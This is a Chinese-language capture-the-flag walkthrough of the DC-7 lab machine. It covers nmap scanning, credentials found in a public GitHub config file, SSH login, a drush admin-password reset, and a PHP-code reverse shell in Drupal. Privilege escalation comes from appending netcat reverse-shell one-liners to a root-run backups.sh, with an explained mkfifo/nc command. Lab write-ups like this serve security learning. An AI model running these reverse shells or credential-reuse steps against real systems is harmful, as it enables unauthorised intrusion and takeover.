
## 靶机信息
级别:容易

## Recon
### nmap

```shell
sudo arp-scan -l
//IP:192.168.1.163

sudo nmap --min-rate 10000 -p- -sT 192.168.1.163
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

sudo nmap -sT -sC -sV -O -p 22,80 192.168.1.163 -oA tcp_scan/details

```

## Web



![[Pasted image 20231021013332.png]]
![[Pasted image 20231021015417.png]]

```google
@DC7USER
https://github.com/Dc7User/staffdb/blob/master/config.php

```

![[Pasted image 20231021015354.png]]
```shell
dc7user
MdR3xOgB7#dW //看到这个凭证是数据库的凭证，但是端口扫描结果并没有数据库服务，尝试使用这个凭据登录SSH
```

## 提权

![[Pasted image 20231021020603.png]]


```shell
drush sql-dump --result-file=/home/dc7user/backups/website.sql

/var/www/html
drush user-password --password='passwd'

//此时可以在网页使用admin passwd登录后台
```

```shell
install new module 

https://www.drupal.org/project/php

```

安装php
![[Pasted image 20231021143902.png]]
```shell
//新建一个页面Text format选择 PHP code 将反弹shell内容复制进去，点击preview即可
```
![[Pasted image 20231021160858.png]]
此时已经得到了www-data用户的shell，将反弹shell输入到backup.sh中即可

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.136 1234 >/tmp/f" >> backups.sh

1. - `rm /tmp/f`：这会尝试删除 `/tmp/f` 文件，如果它存在的话。`rm`是删除文件的命令。
        
    - `mkfifo /tmp/f`：这会创建一个具有FIFO（First-In, First-Out）特性的文件 `/tmp/f`。FIFO是一种特殊类型的文件，用于进程之间的通信，通常用于管道。
        
    - `cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.136 1234 >/tmp/f`：这是一系列管道操作，它们的目的是在远程服务器 `192.168.1.136` 上建立一个反向Shell连接。它执行以下操作：
        
        - `cat /tmp/f`：这会将 `/tmp/f` 中的内容输出到标准输出。
        - `/bin/sh -i 2>&1`：这将启动一个交互式的Shell进程（`/bin/sh`）并将其标准输入和标准错误重定向到管道，以便通过网络传输。
        - `nc 192.168.1.136 1234`：这会使用`nc`命令（netcat）将Shell连接到IP地址 `192.168.1.136` 上的端口 `1234`，这实际上会建立一个远程Shell连接。
        - `>/tmp/f`：这将将来自Shell连接的输出写回 `/tmp/f` 文件。
2. `>> backups.sh`：这将把上述命令追加到名为 `backups.sh` 的文件中，如果该文件不存在，它将被创建。


msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.136 lport=1234 R
mkfifo /tmp/tshpi; nc 192.168.1.136 1234 0</tmp/tshpi | /bin/sh >/tmp/tshpi 2>&1; rm /tmp/tshpi

echo 'mkfifo /tmp/tshpi; nc 192.168.1.136 1234 0</tmp/tshpi | /bin/sh >/tmp/tshpi 2>&1; rm /tmp/tshpi' >> backups.sh

```

![[Pasted image 20231021165008.png]]


